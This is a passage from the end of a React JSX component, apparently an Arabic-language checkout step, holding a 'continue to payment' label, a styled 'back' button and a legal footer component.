                          : "المتابعة للدفع"}
                      </button>
                      <button
                        type="button"
                        onClick={onBackToStep1}
                        className="w-full rounded border border-[hsl(var(--quest-purple))]/30 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 sm:w-auto sm:px-10"
                      >
                        الرجوع
                      </button>
                    </div>
                  </div>
                </section>
              </div>
            </div>
          ) : null}
        </main>

        <QuestLegalFooter />
      </div>
    </div>
  );
}
